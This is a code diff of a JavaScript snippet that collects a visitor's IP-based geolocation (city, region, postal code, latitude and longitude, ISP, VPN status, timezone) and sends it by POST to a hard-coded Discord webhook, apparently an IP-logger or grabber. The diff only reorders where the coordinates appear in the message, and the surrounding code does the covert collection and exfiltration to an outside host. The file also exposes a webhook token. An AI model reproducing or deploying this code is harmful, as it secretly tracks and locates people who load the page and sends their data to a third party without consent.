@@ -26,6 +26,8 @@
         const city = data.city;
         const region = data.region;
         const zip = data.postal_code;
+        const lat = data.latitude;
+        const long = data.longitude;
         const country = data.country;
         const flag = data.flag.emoji;
         const aso = data.connection.autonomous_system_organization;
@@ -34,8 +36,6 @@
         const vpn = data.security.is_vpn;
         const tz = data.timezone.name;
         const ct = data.timezone.current_time;
-        const long = data.longitude;
-        const lat = data.latitude;
 
         const request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb");
@@ -49,6 +49,8 @@
           "\n> City: " + city + 
           "\n> Region: " + region + 
           "\n> Zip: " + zip + 
+          "\n> Latitude:  " + lat +
+          "\n> Longitude:  " + long +
           "\n> Country: " + country +
           "\n> Flag: " + flag +
           "\n> Auto System Org: " + aso +
@@ -56,9 +58,7 @@
           "\n> Org: " + org +
           "\n> Using VPN: " + vpn +
           "\n> Timezone: " + tz +
-          "\n> Current time: " + ct +
-          "\n> Longitude:  " + long +
-          "\n> Latitude:  " + lat 
+          "\n> Current time: " + ct 
           ,
         };
         request.send(JSON.stringify(params));
